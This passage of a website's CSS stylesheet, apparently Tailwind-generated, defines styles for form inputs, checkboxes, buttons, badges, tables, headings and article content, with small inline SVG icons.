            background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='%23fff' viewBox='0 0 16 16'%3E%3Cpath d='M12.207 4.793a1 1 0 0 1 0 1.414l-5 5a1 1 0 0 1-1.414 0l-2-2a1 1 0 0 1 1.414-1.414L6.5 9.086l4.293-4.293a1 1 0 0 1 1.414 0'/%3E%3C/svg%3E")
        }

        @media (forced-colors:active) {
            [type=checkbox]:checked {
                -webkit-appearance: auto;
                -moz-appearance: auto;
                appearance: auto
            }
        }

        [type=radio]:checked {
            background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='%23fff' viewBox='0 0 16 16'%3E%3Ccircle cx='8' cy='8' r='3'/%3E%3C/svg%3E")
        }

        @media (forced-colors:active) {
            [type=radio]:checked {
                -webkit-appearance: auto;
                -moz-appearance: auto;
                appearance: auto
            }
        }

        [type=checkbox]:checked:focus,
        [type=checkbox]:checked:hover,
        [type=radio]:checked:focus,
        [type=radio]:checked:hover {
            background-color: currentColor;
            border-color: transparent
        }

        [type=checkbox]:indeterminate {
            background-color: currentColor;
            background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 16 16'%3E%3Cpath stroke='%23fff' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M4 8h8'/%3E%3C/svg%3E");
            background-position: 50%;
            background-repeat: no-repeat;
            background-size: 100% 100%;
            border-color: transparent
        }

        @media (forced-colors:active) {
            [type=checkbox]:indeterminate {
                -webkit-appearance: auto;
                -moz-appearance: auto;
                appearance: auto
            }
        }

        [type=checkbox]:indeterminate:focus,
        [type=checkbox]:indeterminate:hover {
            background-color: currentColor;
            border-color: transparent
        }

        [type=file] {
            background: unset;
            border-color: inherit;
            border-radius: 0;
            border-width: 0;
            font-size: unset;
            line-height: inherit;
            padding: 0
        }

        [type=file]:focus {
            outline: 1px solid ButtonText;
            outline: 1px auto -webkit-focus-ring-color
        }

        :root {
            --primary-color: #005aab;
            --secondary-color: #fbac29;
            --base-font-size: 16px;
            --base-line-height: 1.6;
            --base-font-weight: 400;
            font-family: Roboto, "Roboto Fallback: Arial"
        }

        .container {
            width: 100%
        }

        @media (min-width:640px) {
            .container {
                max-width: 640px
            }
        }

        @media (min-width:768px) {
            .container {
                max-width: 768px
            }
        }

        @media (min-width:1024px) {
            .container {
                max-width: 1024px
            }
        }

        @media (min-width:1280px) {
            .container {
                max-width: 1280px
            }
        }

        @media (min-width:1440px) {
            .container {
                max-width: 1440px
            }
        }

        @media (min-width:1920px) {
            .container {
                max-width: 1920px
            }
        }

        .form-input,
        .form-multiselect,
        .form-select,
        .form-textarea {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            background-color: #fff;
            border-color: #6b7280;
            border-radius: 0;
            border-width: 1px;
            font-size: 1rem;
            line-height: 1.5rem;
            padding: .5rem .75rem;
            --tw-shadow: 0 0 #0000
        }

        .form-input:focus,
        .form-multiselect:focus,
        .form-select:focus,
        .form-textarea:focus {
            outline: 2px solid transparent;
            outline-offset: 2px;
            --tw-ring-inset: var(--tw-empty, );
            --tw-ring-offset-width: 0px;
            --tw-ring-offset-color: #fff;
            --tw-ring-color: #2563eb;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            border-color: #2563eb;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
        }

        .form-select {
            background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3E%3Cpath stroke='%236b7280' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m6 8 4 4 4-4'/%3E%3C/svg%3E");
            background-position: right .5rem center;
            background-repeat: no-repeat;
            background-size: 1.5em 1.5em;
            padding-right: 2.5rem;
            -webkit-print-color-adjust: exact;
            print-color-adjust: exact
        }

        .form-select:where([size]:not([size="1"])) {
            background-image: none;
            background-position: 0 0;
            background-repeat: unset;
            background-size: initial;
            padding-right: .75rem;
            -webkit-print-color-adjust: unset;
            print-color-adjust: unset
        }

        .form-default {
            border-color: transparent;
            font-weight: 500;
            padding: 0
        }

        .form-default:focus {
            border-color: transparent;
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000)
        }

        .form-default:-webkit-autofill,
        .form-default:-webkit-autofill:focus,
        .form-default:-webkit-autofill:hover {
            -webkit-box-shadow: inset 0 0 0 1000px #fff !important;
            -webkit-text-fill-color: #000 !important;
            border: none;
            outline: none
        }

        .form-rounded {
            border-radius: 9999px;
            border-width: 1px;
            width: 100%;
            --tw-border-opacity: 1;
            border-color: rgb(158 158 158/var(--tw-border-opacity, 1));
            padding: .5rem 1rem
        }

        .form-rounded::-moz-placeholder {
            --tw-text-opacity: 1;
            color: rgb(134 134 134/var(--tw-text-opacity, 1))
        }

        .form-rounded::placeholder {
            --tw-text-opacity: 1;
            color: rgb(134 134 134/var(--tw-text-opacity, 1))
        }

        .form-rounded:focus-within {
            --tw-border-opacity: 1;
            border-color: rgb(0 90 171/var(--tw-border-opacity, 1))
        }

        .form-rounded:focus {
            --tw-border-opacity: 1;
            border-color: rgb(0 90 171/var(--tw-border-opacity, 1));
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000)
        }

        .form-rounded:disabled {
            border-color: transparent;
            --tw-bg-opacity: 1;
            background-color: rgb(241 245 249/var(--tw-bg-opacity, 1));
            --tw-text-opacity: 1;
            color: rgb(128 128 128/var(--tw-text-opacity, 1))
        }

        .form-error {
            --tw-border-opacity: 1;
            border-color: rgb(236 33 61/var(--tw-border-opacity, 1));
            --tw-bg-opacity: 1;
            background-color: rgb(253 227 228/var(--tw-bg-opacity, 1));
            --tw-text-opacity: 1;
            color: rgb(202 45 51/var(--tw-text-opacity, 1))
        }

        .form-error:-webkit-autofill,
        .form-error:-webkit-autofill:focus,
        .form-error:-webkit-autofill:hover {
            -webkit-box-shadow: inset 0 0 0 1000px #fde3e4 !important
        }

        .form-select {
            border-radius: 32px;
            border-width: 1px;
            display: flex;
            min-height: 2.75rem;
            --tw-border-opacity: 1;
            background-image: none;
            border-color: rgb(158 158 158/var(--tw-border-opacity, 1));
            padding-left: 1rem;
            padding-right: 1rem
        }

        @media (min-width:768px) {
            .form-select {
                min-height: 3rem
            }
        }

        .form-select .vs__selected-options {
            flex-wrap: nowrap;
            width: 0
        }

        .form-select.vs--disabled,
        .form-select.vs--disabled .vs__dropdown-toggle,
        .form-select.vs--disabled .vs__search {
            --tw-bg-opacity: 1;
            background-color: rgb(241 245 249/var(--tw-bg-opacity, 1))
        }

        .form-select .vs__dropdown-toggle {
            border-style: none;
            height: 100%;
            margin: auto;
            overflow: hidden;
            padding: 0;
            width: 100%
        }

        .form-select .vs__search {
            margin: 0
        }

        .form-select .vs__search::-moz-placeholder {
            text-align: left;
            --tw-text-opacity: 1;
            color: rgb(134 134 134/var(--tw-text-opacity, 1))
        }

        .form-select .vs__search::placeholder {
            text-align: left;
            --tw-text-opacity: 1;
            color: rgb(134 134 134/var(--tw-text-opacity, 1))
        }

        .form-select .vs__selected {
            display: block;
            margin: 0;
            max-width: 100%;
            overflow: hidden;
            padding: .25rem 0 0;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        .form-select .vs__dropdown-menu {
            border-radius: 1rem;
            border-width: 1px;
            padding: 0;
            top: calc(100% + 12px);
            --tw-text-opacity: 1;
            color: rgb(134 134 134/var(--tw-text-opacity, 1))
        }

        .form-select .vs__dropdown-menu .vs__dropdown-option {
            padding-bottom: .75rem;
            padding-top: .75rem
        }

        .form-select .vs__dropdown-menu .vs__dropdown-option.vs__dropdown-option--highlight {
            --tw-bg-opacity: 1;
            background-color: rgb(229 239 247/var(--tw-bg-opacity, 1));
            font-weight: 600;
            --tw-text-opacity: 1;
            color: rgb(0 90 171/var(--tw-text-opacity, 1))
        }

        .no-arrow::-webkit-inner-spin-button,
        .no-arrow::-webkit-outer-spin-button {
            -webkit-appearance: none;
            margin: 0
        }

        .no-arrow {
            appearance: textfield
        }

        .input-label {
            font-size: .875rem;
            line-height: 1.25rem;
            --tw-text-opacity: 1;
            color: rgb(76 76 76/var(--tw-text-opacity, 1))
        }

        .input-form {
            border-radius: 9999px;
            border-style: none;
            border-width: 0;
            min-height: 3rem;
            width: 100%;
            --tw-bg-opacity: 1;
            background-color: rgb(255 255 255/var(--tw-bg-opacity, 1));
            padding: .625rem 1rem;
            --tw-text-opacity: 1;
            color: rgb(0 0 0/var(--tw-text-opacity, 1));
            outline-color: #b3b3b3;
            outline-style: solid
        }

        .input-form:hover {
            outline-color: #32508f
        }

        .input-form.input-blue {
            outline-color: #99bddd
        }

        .input-form.input-blue::-moz-placeholder {
            --tw-text-opacity: 1 !important;
            color: rgb(153 189 221/var(--tw-text-opacity, 1)) !important
        }

        .input-form.input-blue::placeholder {
            --tw-text-opacity: 1 !important;
            color: rgb(153 189 221/var(--tw-text-opacity, 1)) !important
        }

        .input-form.input-blue:hover {
            outline-color: #99bddd
        }

        .input-form.input-blue:focus {
            border-width: 0;
            outline-color: #99bddd !important
        }

        .input-form.input-blue:active,
        .input-form.input-blue:focus {
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color) !important;
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(var(--tw-ring-offset-width)) var(--tw-ring-color) !important;
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000) !important
        }

        .input-form.use-prefix {
            padding-left: 4rem
        }

        .input-form.use-suffix {
            padding-right: 4rem
        }

        .input-form.use-icon {
            padding-left: 2.5rem
        }

        .input-form.use-right-icon {
            padding-right: 2.5rem
        }

        .input-form.textarea {
            border-radius: 1rem;
            min-height: 5rem
        }

        .input-form.error-input {
            --tw-bg-opacity: 1;
            background-color: rgb(255 208 208/var(--tw-bg-opacity, 1))
        }

        .input-form.disabled-input {
            cursor: not-allowed;
            --tw-bg-opacity: 1;
            background-color: rgb(242 242 242/var(--tw-bg-opacity, 1));
            --tw-text-opacity: 1;
            color: rgb(128 128 128/var(--tw-text-opacity, 1))
        }

        .input-form.disabled-input:hover {
            outline-color: #b3b3b3
        }

        .input-wrapper .input-left-icon {
            left: 1rem
        }

        .input-wrapper .input-left-icon,
        .input-wrapper .input-right-icon {
            position: absolute;
            top: 50%;
            --tw-translate-y: -50%;
            font-size: 1.125rem;
            line-height: 1.75rem;
            transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
            --tw-text-opacity: 1;
            color: rgb(13 13 13/var(--tw-text-opacity, 1))
        }

        .input-wrapper .input-right-icon {
            cursor: pointer;
            right: 1rem
        }

        .input-wrapper .prefix {
            border-bottom-left-radius: 9999px;
            border-top-left-radius: 9999px;
            left: 0;
            padding: .75rem 1rem
        }

        .input-wrapper .prefix,
        .input-wrapper .suffix {
            align-items: center;
            display: flex;
            height: 100%;
            justify-content: center;
            position: absolute;
            top: 0;
            --tw-bg-opacity: 1;
            background-color: rgb(245 245 245/var(--tw-bg-opacity, 1));
            font-size: .875rem;
            font-weight: 700;
            line-height: 1.25rem;
            --tw-text-opacity: 1;
            color: rgb(66 66 66/var(--tw-text-opacity, 1));
            outline-color: #b3b3b3;
            outline-style: solid
        }

        .input-wrapper .suffix {
            border-bottom-right-radius: 9999px;
            border-top-right-radius: 9999px;
            padding: .75rem;
            right: 0
        }

        .input-wrapper:has(.input-blue) .prefix,
        .input-wrapper:has(.input-blue) .suffix {
            --tw-bg-opacity: 1;
            background-color: rgb(229 239 247/var(--tw-bg-opacity, 1));
            --tw-text-opacity: 1;
            color: rgb(153 189 221/var(--tw-text-opacity, 1));
            outline-width: 0
        }

        .input-wrapper .password-icon {
            position: absolute;
            right: 1rem;
            top: 50%;
            --tw-translate-y: -50%;
            font-size: 1.125rem;
            line-height: 1.75rem;
            transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
            --tw-text-opacity: 1;
            color: rgb(86 86 86/var(--tw-text-opacity, 1))
        }

        .input-wrapper:focus-within .input-left-icon {
            --tw-text-opacity: 1;
            color: rgb(50 80 143/var(--tw-text-opacity, 1))
        }

        .input-wrapper:focus-within .prefix,
        .input-wrapper:focus-within .suffix {
            outline-color: #32508f
        }

        .input-wrapper.error-input .input-form,
        .input-wrapper.error-input .prefix,
        .input-wrapper.error-input .suffix {
            --tw-bg-opacity: 1;
            background-color: rgb(255 208 208/var(--tw-bg-opacity, 1))
        }

        .input-wrapper.disabled-input {
            cursor: not-allowed
        }

        .input-wrapper.disabled-input .input-form,
        .input-wrapper.disabled-input .prefix,
        .input-wrapper.disabled-input .suffix {
            --tw-bg-opacity: 1;
            background-color: rgb(242 242 242/var(--tw-bg-opacity, 1));
            --tw-text-opacity: 1;
            color: rgb(128 128 128/var(--tw-text-opacity, 1))
        }

        .input-wrapper.disabled-input .input-form:hover,
        .input-wrapper.disabled-input .prefix:hover,
        .input-wrapper.disabled-input .suffix:hover {
            outline-color: #b3b3b3
        }

        .error-msg {
            color: rgb(208 82 83/var(--tw-text-opacity, 1))
        }

        .error-msg,
        .helper-text {
            align-items: center;
            display: flex;
            font-size: .75rem;
            gap: .25rem;
            line-height: 1rem;
            --tw-text-opacity: 1
        }

        .helper-text {
            color: rgb(134 134 134/var(--tw-text-opacity, 1))
        }

        .\!btn {
            align-items: center;
            border-radius: 9999px;
            display: inline-flex;
            font-weight: 500;
            gap: .75rem;
            height: 2.75rem;
            justify-content: center;
            padding-left: 1.5rem;
            padding-right: 1.5rem;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none
        }

        .\!btn:disabled {
            pointer-events: none;
            --tw-border-opacity: 1;
            border-color: rgb(134 134 134/var(--tw-border-opacity, 1));
            --tw-bg-opacity: 1;
            background-color: rgb(242 242 242/var(--tw-bg-opacity, 1));
            --tw-text-opacity: 1 !important;
            color: rgb(134 134 134/var(--tw-text-opacity, 1)) !important;
            --tw-shadow: 0 0 #0000;
            --tw-shadow-colored: 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)
        }

        .btn {
            align-items: center;
            border-radius: 9999px;
            display: inline-flex;
            font-weight: 500;
            gap: .75rem;
            height: 2.75rem;
            justify-content: center;
            padding-left: 1.5rem;
            padding-right: 1.5rem;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none
        }

        .btn:disabled {
            pointer-events: none;
            --tw-border-opacity: 1;
            border-color: rgb(134 134 134/var(--tw-border-opacity, 1));
            --tw-bg-opacity: 1;
            background-color: rgb(242 242 242/var(--tw-bg-opacity, 1));
            --tw-text-opacity: 1 !important;
            color: rgb(134 134 134/var(--tw-text-opacity, 1)) !important;
            --tw-shadow: 0 0 #0000;
            --tw-shadow-colored: 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)
        }

        .\!btn.disabled {
            pointer-events: none;
            --tw-border-opacity: 1;
            border-color: rgb(61 61 61/var(--tw-border-opacity, 1));
            --tw-bg-opacity: 1;
            --tw-text-opacity: 1;
            color: rgb(61 61 61/var(--tw-text-opacity, 1))
        }

        .\!btn.disabled,
        .\!btn.disabled:hover {
            background-color: rgb(242 242 242/var(--tw-bg-opacity, 1))
        }

        .\!btn.disabled:hover {
            --tw-bg-opacity: 1
        }

        .btn.disabled {
            pointer-events: none;
            --tw-border-opacity: 1;
            border-color: rgb(61 61 61/var(--tw-border-opacity, 1));
            --tw-bg-opacity: 1;
            --tw-text-opacity: 1;
            color: rgb(61 61 61/var(--tw-text-opacity, 1))
        }

        .btn.disabled,
        .btn.disabled:hover {
            background-color: rgb(242 242 242/var(--tw-bg-opacity, 1))
        }

        .btn-primary,
        .btn.disabled:hover {
            --tw-bg-opacity: 1
        }

        .btn-primary {
            background-color: rgb(0 90 171/var(--tw-bg-opacity, 1));
            --tw-text-opacity: 1;
            color: rgb(255 255 255/var(--tw-text-opacity, 1))
        }

        .btn-primary:hover {
            --tw-bg-opacity: 1;
            background-color: rgb(51 123 188/var(--tw-bg-opacity, 1))
        }

        .btn-primary-outline {
            border-width: 1px;
            --tw-border-opacity: 1;
            border-color: rgb(0 90 171/var(--tw-border-opacity, 1));
            --tw-bg-opacity: 1;
            background-color: rgb(255 255 255/var(--tw-bg-opacity, 1));
            --tw-text-opacity: 1;
            color: rgb(0 90 171/var(--tw-text-opacity, 1))
        }

        .btn-primary-outline:hover {
            --tw-bg-opacity: 1;
            background-color: rgb(0 90 171/var(--tw-bg-opacity, 1));
            --tw-text-opacity: 1;
            color: rgb(255 255 255/var(--tw-text-opacity, 1))
        }

        .btn-primary-outline:disabled {
            --tw-bg-opacity: 1;
            background-color: rgb(255 255 255/var(--tw-bg-opacity, 1))
        }

        .btn-danger {
            --tw-bg-opacity: 1;
            background-color: rgb(236 33 61/var(--tw-bg-opacity, 1));
            --tw-text-opacity: 1;
            color: rgb(255 255 255/var(--tw-text-opacity, 1))
        }

        .btn-danger:hover {
            --tw-bg-opacity: 1;
            background-color: rgb(255 128 128/var(--tw-bg-opacity, 1))
        }

        .btn-danger-outline {
            border-width: 1px;
            --tw-border-opacity: 1;
            border-color: rgb(236 33 61/var(--tw-border-opacity, 1));
            --tw-bg-opacity: 1;
            background-color: rgb(255 255 255/var(--tw-bg-opacity, 1));
            --tw-text-opacity: 1;
            color: rgb(236 33 61/var(--tw-text-opacity, 1))
        }

        .btn-danger-outline:hover {
            --tw-bg-opacity: 1;
            background-color: rgb(236 33 61/var(--tw-bg-opacity, 1));
            --tw-text-opacity: 1;
            color: rgb(255 255 255/var(--tw-text-opacity, 1))
        }

        .btn-danger-outline:disabled {
            --tw-bg-opacity: 1;
            background-color: rgb(255 255 255/var(--tw-bg-opacity, 1))
        }

        .btn-icon {
            align-items: center;
            aspect-ratio: 1/1;
            border-radius: 9999px;
            border-width: 1px;
            display: flex;
            height: 2.75rem;
            justify-content: center;
            width: 2.75rem;
            z-index: 2;
            --tw-shadow: 0 1px 3px 0 rgba(0, 0, 0, .1), 0 1px 2px -1px rgba(0, 0, 0, .1);
            --tw-shadow-colored: 0 1px 3px 0 var(--tw-shadow-color), 0 1px 2px -1px var(--tw-shadow-color)
        }

        .btn-icon,
        .btn-icon:disabled {
            box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)
        }

        .btn-icon:disabled {
            --tw-border-opacity: 1;
            border-color: rgb(207 207 207/var(--tw-border-opacity, 1));
            --tw-bg-opacity: 1 !important;
            background-color: rgb(242 242 242/var(--tw-bg-opacity, 1)) !important;
            --tw-text-opacity: 1;
            color: rgb(61 61 61/var(--tw-text-opacity, 1));
            --tw-shadow: 0 0 #0000;
            --tw-shadow-colored: 0 0 #0000
        }

        @media (min-width:768px) {
            .btn-icon {
                height: 2.5rem;
                width: 2.5rem
            }
        }

        .badge {
            border-radius: 9999px;
            font-size: .875rem;
            font-weight: 600;
            line-height: 1.25rem;
            padding: .75rem 1.25rem
        }

        .badge-sm {
            padding: .25rem .75rem
        }

        .badge-gray {
            border-width: 1px;
            --tw-border-opacity: 1;
            background-color: rgb(237 237 237/var(--tw-bg-opacity, 1));
            border-color: rgb(224 224 224/var(--tw-border-opacity, 1));
            color: rgb(158 158 158/var(--tw-text-opacity, 1))
        }

        .badge-gray,
        .badge-primary {
            --tw-bg-opacity: 1;
            --tw-text-opacity: 1
        }

        .badge-primary {
            background-color: rgb(204 222 238/var(--tw-bg-opacity, 1));
            color: rgb(51 123 188/var(--tw-text-opacity, 1))
        }

        .badge-warning {
            background-color: rgb(253 228 194/var(--tw-bg-opacity, 1));
            color: rgb(247 166 51/var(--tw-text-opacity, 1))
        }

        .badge-success,
        .badge-warning {
            --tw-bg-opacity: 1;
            --tw-text-opacity: 1
        }

        .badge-success {
            background-color: rgb(142 204 187/var(--tw-bg-opacity, 1));
            color: rgb(29 153 120/var(--tw-text-opacity, 1))
        }

        .badge-danger {
            background-color: rgb(249 188 197/var(--tw-bg-opacity, 1));
            color: rgb(236 33 61/var(--tw-text-opacity, 1))
        }

        .badge-danger,
        .badge-tag {
            --tw-bg-opacity: 1;
            --tw-text-opacity: 1
        }

        .badge-tag {
            background-color: rgb(229 239 247/var(--tw-bg-opacity, 1));
            border-radius: 9999px;
            color: rgb(134 134 134/var(--tw-text-opacity, 1));
            font-size: 10px;
            padding: .25rem .5rem
        }

        @media (min-width:768px) {
            .badge-tag {
                font-size: .75rem;
                line-height: 1rem
            }
        }

        .table {
            border-collapse: collapse;
            border-radius: .5rem;
            font-size: .875rem;
            line-height: 1.25rem;
            overflow: hidden;
            text-align: left;
            width: 100%;
            --tw-shadow: 0 4px 6px -1px rgba(0, 0, 0, .1), 0 2px 4px -2px rgba(0, 0, 0, .1);
            --tw-shadow-colored: 0 4px 6px -1px var(--tw-shadow-color), 0 2px 4px -2px var(--tw-shadow-color);
            box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)
        }

        .table th,
        .table thead {
            white-space: nowrap;
            --tw-bg-opacity: 1;
            background-color: rgb(0 90 171/var(--tw-bg-opacity, 1));
            font-weight: 600;
            --tw-text-opacity: 1;
            color: rgb(255 255 255/var(--tw-text-opacity, 1))
        }

        @media not all and (min-width:768px) {

            .table th,
            .table thead {
                width: auto
            }
        }

        .table td,
        .table th {
            padding: .5rem 1rem
        }

        @media not all and (min-width:768px) {

            .table td,
            .table th {
                width: auto
            }
        }

        .table th:first-child {
            border-top-left-radius: .5rem
        }

        .table th:last-child {
            border-top-right-radius: .5rem
        }

        .table tbody {
            border-bottom-left-radius: .5rem;
            border-bottom-right-radius: .5rem;
            box-shadow: 0 0 0 1px #e5e5e5
        }

        .table tbody tr {
            --tw-text-opacity: 1;
            color: rgb(37 37 37/var(--tw-text-opacity, 1))
        }

        .table tbody tr:nth-child(2n) {
            --tw-bg-opacity: 1;
            background-color: rgb(249 249 249/var(--tw-bg-opacity, 1))
        }

        .h1 {
            font-size: 1.5rem;
            font-weight: 700;
            line-height: 2rem;
            line-height: 1.375
        }

        @media (min-width:768px) {
            .h1 {
                font-size: 64px
            }
        }

        .h2 {
            font-size: 1.5rem;
            font-weight: 700;
            line-height: 2rem;
            line-height: 1.375
        }

        @media (min-width:768px) {
            .h2 {
                font-size: 48px
            }
        }

        .h3 {
            font-size: 1.5rem;
            font-weight: 700;
            line-height: 2rem;
            line-height: 1.375
        }

        @media (min-width:768px) {
            .h3 {
                font-size: 40px
            }
        }

        .h4 {
            font-size: 1.25rem;
            font-weight: 700;
            line-height: 1.75rem;
            line-height: 1.375
        }

        @media (min-width:768px) {
            .h4 {
                font-size: 36px
            }
        }

        .h5 {
            font-size: 1.25rem;
            font-weight: 700;
            line-height: 1.75rem;
            line-height: 1.375
        }

        @media (min-width:768px) {
            .h5 {
                font-size: 32px
            }
        }

        .h6 {
            font-size: 1.125rem;
            font-weight: 700;
            line-height: 1.75rem;
            line-height: 1.375
        }

        @media (min-width:768px) {
            .h6 {
                font-size: 26px
            }
        }

        .h7 {
            font-size: 1.125rem;
            font-weight: 700;
            line-height: 1.75rem;
            line-height: 1.375
        }

        @media (min-width:768px) {
            .h7 {
                font-size: 1.5rem;
                line-height: 2rem
            }
        }

        .h8 {
            font-size: 1.125rem;
            font-weight: 700;
            line-height: 1.75rem;
            line-height: 1.375
        }

        .container {
            margin-left: auto;
            margin-right: auto;
            max-width: 1166px;
            width: 92%
        }

        @media (min-width:768px) {
            .container {
                width: 94%
            }
        }

        .container-right {
            margin-left: max(4%, calc(50vw - 583px));
            margin-right: 0;
            width: auto
        }

        @media (min-width:768px) {
            .container-right {
                margin-left: max(3%, calc(50vw - 583px))
            }
        }

        .card {
            border-radius: .75rem;
            border-width: 1px
        }

        .blue-card {
            border-color: transparent;
            border-radius: .75rem;
            --tw-bg-opacity: 1;
            background-color: rgb(229 239 247/var(--tw-bg-opacity, 1));
            padding: .75rem 1rem
        }

        @media (min-width:768px) {
            .blue-card {
                padding: 1rem 1.5rem
            }
        }

        .custom-scroll::-webkit-scrollbar {
            width: 5px
        }

        .custom-scroll::-webkit-scrollbar-track {
            border-radius: .5rem;
            --tw-bg-opacity: 1;
            background-color: rgb(249 250 251/var(--tw-bg-opacity, 1))
        }

        .custom-scroll::-webkit-scrollbar-thumb {
            border-radius: .5rem;
            --tw-bg-opacity: 1;
            background-color: rgb(0 90 171/var(--tw-bg-opacity, 1))
        }

        .custom-shadow {
            box-shadow: 0 2px 25px #00000012
        }

        .custom-shadow-2 {
            box-shadow: 0 2px 10px #0000001a
        }

        .no-scrollbar::-webkit-scrollbar {
            display: none
        }

        .no-scrollbar {
            -ms-overflow-style: none;
            scrollbar-width: none
        }

        .article h1,
        .article h2 {
            --tw-text-opacity: 1;
            color: rgb(37 37 37/var(--tw-text-opacity, 1))
        }

        .article p {
            --tw-text-opacity: 1;
            color: rgb(86 86 86/var(--tw-text-opacity, 1))
        }

        .article>ul {
            display: grid;
            gap: .25rem;
            padding-top: .5rem
        }

        .article>ul>li {
            padding-left: 2rem;
            position: relative
        }

        .article>ul>li:before {
            border-radius: 9999px;
            content: var(--tw-content);
            height: 1rem;
            left: 0;
            position: absolute;
            top: .25rem;
            width: 1rem;
            --tw-bg-opacity: 1;
            background-color: rgb(251 194 41/var(--tw-bg-opacity, 1))
        }

        .article>ul>li>ul {
            display: grid;
            gap: .25rem;
            padding-top: .5rem
        }

        .article>ul>li>ul>li {
            padding-left: 1.5rem;
            position: relative
        }

        .article>ul>li>ul>li:before {
            height: .5rem;
            left: 0;
            position: absolute;
            top: 50%;
            width: .5rem;
            --tw-translate-y: -50%;
            border-radius: 9999px;
            content: var(--tw-content);
            transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
            --tw-bg-opacity: 1;
            background-color: rgb(251 194 41/var(--tw-bg-opacity, 1))
        }

        .article ol {
            list-style-type: decimal;
            padding-left: 1.5rem
        }

        .article a {
            --tw-text-opacity: 1;
            color: rgb(0 90 171/var(--tw-text-opacity, 1));
            text-decoration-line: underline
        }

        .article .mgz-element-button a {
            align-items: center;
            border-radius: 9999px;
            display: inline-flex;
            font-weight: 500;
            gap: .75rem;
            height: 2.75rem;
            justify-content: center;
            padding-left: 1.5rem;
            padding-right: 1.5rem;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none
        }

        .article .mgz-element-button a:disabled {
            pointer-events: none;
            --tw-border-opacity: 1;
            border-color: rgb(134 134 134/var(--tw-border-opacity, 1));
            --tw-bg-opacity: 1;
            background-color: rgb(242 242 242/var(--tw-bg-opacity, 1));
            --tw-text-opacity: 1 !important;
            color: rgb(134 134 134/var(--tw-text-opacity, 1)) !important;
            --tw-shadow: 0 0 #0000;
            --tw-shadow-colored: 0 0 #0000;
            box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)
        }

        .article .mgz-element-button a.disabled {
            pointer-events: none;
            --tw-border-opacity: 1;
            border-color: rgb(61 61 61/var(--tw-border-opacity, 1));
            --tw-bg-opacity: 1;
            background-color: rgb(242 242 242/var(--tw-bg-opacity, 1));
            --tw-text-opacity: 1;
            color: rgb(61 61 61/var(--tw-text-opacity, 1))
        }

        .article .mgz-element-button a.disabled:hover {
            --tw-bg-opacity: 1;
            background-color: rgb(242 242 242/var(--tw-bg-opacity, 1))
        }

        .article .mgz-element-button a {
            --tw-bg-opacity: 1;
            background-color: rgb(0 90 171/var(--tw-bg-opacity, 1));
            --tw-text-opacity: 1;
            color: rgb(255 255 255/var(--tw-text-opacity, 1))
        }

        .article .mgz-element-button a:hover {
            --tw-bg-opacity: 1;
            background-color: rgb(51 123 188/var(--tw-bg-opacity, 1))
        }

        .article .mgz-element-button a {
            text-decoration-line: none
        }

        .sr-only {
            height: 1px;
            margin: -1px;
            overflow: hidden;
            padding: 0;
            position: absolute;
            width: 1px;
            clip: rect(0, 0, 0, 0);
            border-width: 0;
            white-space: nowrap
        }

        .pointer-events-none {
            pointer-events: none
        }

        .pointer-events-auto {
            pointer-events: auto
        }

        .visible {
            visibility: visible
        }

        .static {
            position: static
        }

        .fixed {
            position: fixed
        }

        .absolute {
            position: absolute
        }

        .relative {
